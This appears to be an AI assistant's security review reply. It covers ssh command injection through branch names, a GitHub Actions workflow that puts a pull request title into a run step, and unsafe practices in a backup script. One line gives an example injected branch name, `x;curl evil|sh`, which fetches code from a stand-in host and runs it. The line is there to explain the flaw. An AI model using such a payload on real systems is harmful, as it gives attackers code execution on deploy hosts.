I couldn't find the deploy script, so I haven't reviewed it yet. Nothing in this workspace builds an ssh command: a search for `ssh`, `branch`, `BRANCH` and `ref_name` came back empty. Could you give me its path, or paste it in? It may live in another repo or on a different branch.

**What it should look like.** Building the remote command by interpolating the branch name is the injection pattern to fix. `ssh` joins its arguments into one string, and the remote shell parses that string again. A branch named something like `x;curl evil|sh` would then run on the deploy host. The fix:
- Check the branch name against an allowlist such as `^[A-Za-z0-9._/-]+$` before using it, and reject anything else rather than trying to clean it up.
- Put a fixed script on the remote host and send the branch as data, not as code, e.g. `ssh host 'deploy.sh "$1"' _ "$branch"` won't work as-is. Instead, pass it on stdin, or quote it with `printf '%q'`, which is only safe if both ends run bash.
- Don't build the command up in a string and then run that string.

**Two other things I noticed while searching:**

1. **`.github/workflows/deploy.yml:14` has a real injection bug, and it fits your concern.** It inserts `${{ github.event.pull_request.title }}` straight into a `run:` step. Anyone who opens a PR controls that title, so they can run shell commands in CI. On top of that, the workflow has `permissions: write-all` and runs on `pull_request`. Fix: pass the title in through `env:` (for example `TITLE: ${{ github.event.pull_request.title }}`) and refer to it as `"$TITLE"` in the script. Also cut permissions to the minimum the job needs.
2. **`scripts/backup.sh` falls short of basic safety practice:**
   - It has no `set -Eeuo pipefail`, so if `tar` fails it still runs `scp` and `rm` anyway.
   - Its temp directory is `/tmp/backup.$$`. Anyone can guess that name, so another user can create it first or plant a symlink there. Use `mktemp -d`.
   - It deletes the temp directory only at the end, not in a `trap … EXIT`, so a failed run leaves the directory and the data archive behind.
   - None of its variables are quoted.
   - It uses old-style backtick command substitution.
   - It runs from a nightly job but doesn't set its own `PATH` or `umask`.

I don't have a shell in this session, so I couldn't run `shellcheck` or `bash -n`. These findings come from reading the files. Send me the deploy script and I'll review it in full.
